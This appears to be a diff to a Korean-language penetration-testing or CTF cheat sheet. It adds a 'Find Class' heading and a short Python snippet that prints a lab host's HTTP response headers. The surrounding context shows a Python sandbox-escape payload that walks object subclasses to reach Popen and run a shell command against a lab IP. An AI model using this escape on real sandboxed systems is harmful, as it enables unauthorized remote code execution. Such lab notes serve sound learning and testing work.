@@ -106,6 +106,7 @@ curl http://localhost -o output.txt
 <details>
   <summary><strong>PYTHON</strong></summary>
 
+## Find Class
 - https://book.hacktricks.wiki/en/generic-methodologies-and-resources/python/bypass-python-sandboxes/index.html?highlight=python#misc-python
 - `CLASS`를 찾아서 RCE 실행.(Popen)
 ```python3
@@ -117,6 +118,17 @@ curl http://localhost -o output.txt
 #    i+=1;
 
 [].__class__.__base__.__subclasses__()[317]('ping 10.10.16.4',shell=True);
+```
+
+## Request Server Headers
+```python3
+import requests;
+response = requests.head('http://help.htb/support/');
+
+# response의 요소 확인.
+dir(response)
+
+print(response.headers);
 ```
 
 ## version check
